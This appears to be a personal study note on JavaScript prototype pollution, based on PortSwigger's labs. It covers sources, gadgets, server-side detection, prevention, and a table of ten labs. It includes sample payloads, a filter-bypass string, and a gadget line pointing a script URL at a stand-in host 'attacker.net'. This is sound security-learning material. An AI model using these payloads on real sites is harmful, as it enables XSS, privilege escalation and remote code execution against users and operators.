---
tags: [hacking, web, portswigger, prototype-pollution]
type: vulnerability-category
source: https://portswigger.net/web-security/prototype-pollution
last-verified: 2026-08-25
---

# Prototype pollution

## Up
- [[PortSwigger]]

## What it is
JavaScript objects inherit from `Object.prototype`. **Prototype pollution** injects properties onto that shared prototype (via `__proto__`, `constructor`, `prototype`), so *every* object suddenly inherits attacker-controlled values. Alone it's often inert; chained with a **gadget** it becomes DOM XSS (client-side) or RCE (server-side).

## How it arises
Recursive merge / property assignment from user input without blocking dangerous keys:
```
?__proto__[evilProperty]=payload
```
effectively runs `target.__proto__.evilProperty = 'payload'`, polluting the prototype. JSON form:
```json
{ "__proto__": { "evilProperty": "payload" } }
```

## Client-side
1. **Find a source** — `location.hash`/`search`, `JSON.parse` input, web messages that flow into a merge.
2. **Find a gadget** — a property read unsafely, e.g. a library building a script URL from an unset config value:
   ```javascript
   script.src = `${transport_url}/example.js`;
   ```
   Pollute it: `?__proto__[transport_url]=//attacker.net` → loads attacker JS.
3. Gadgets can also live in **browser APIs** (`fetch` options, `Object.defineProperty`) and the `constructor.prototype` path when `__proto__` is filtered.

## Server-side
Harder to see (no DOM). Detect by polluting a property that gets **reflected** in a response, or via **indirect** signals (status-code/charset/JSON-spacing changes) when nothing reflects. Impactful gadget: polluting **`child_process` spawn options** (e.g. injecting `NODE_OPTIONS`/`shell`) to achieve **RCE**.

## Prevention
- Sanitize keys — reject `__proto__`, `constructor`, `prototype` in merges.
- Freeze the prototype: `Object.freeze(Object.prototype)`.
- Use null-prototype objects: `Object.create(null)` / `Map`.
- Avoid unsafe recursive merge; use vetted libraries and schema validation.

## Labs
10 labs. Verify exact titles against the live page.

| Lab | Difficulty | General approach | Notes |
|---|---|---|---|
| Client-side prototype pollution via browser APIs | Practitioner | Pollute a config a browser API reads to reach a sink. | |
| DOM XSS via client-side prototype pollution | Practitioner | Pollute a gadget (e.g. `hitCallback`/script src) for XSS. | |
| DOM XSS via an alternative prototype pollution vector | Practitioner | Use `constructor.prototype` when `__proto__` is filtered. | |
| Client-side prototype pollution via flawed sanitization | Practitioner | Bypass a weak key filter (e.g. `__pro__proto__to__`). | |
| Client-side prototype pollution in third-party libraries | Practitioner | Find the gadget inside a bundled library. | |
| Privilege escalation via server-side prototype pollution | Practitioner | Pollute `isAdmin` via a JSON merge. | |
| Detecting server-side prototype pollution without polluted property reflection | Practitioner | Use status/charset side-channels to confirm. | |
| Bypassing flawed input filters for server-side prototype pollution | Practitioner | Defeat the key sanitizer server-side. | |
| Remote code execution via server-side prototype pollution | Practitioner | Pollute spawn options to execute a command. | |
| Exfiltrating sensitive data via server-side prototype pollution | Expert | Pollute to redirect/exfil data. | |
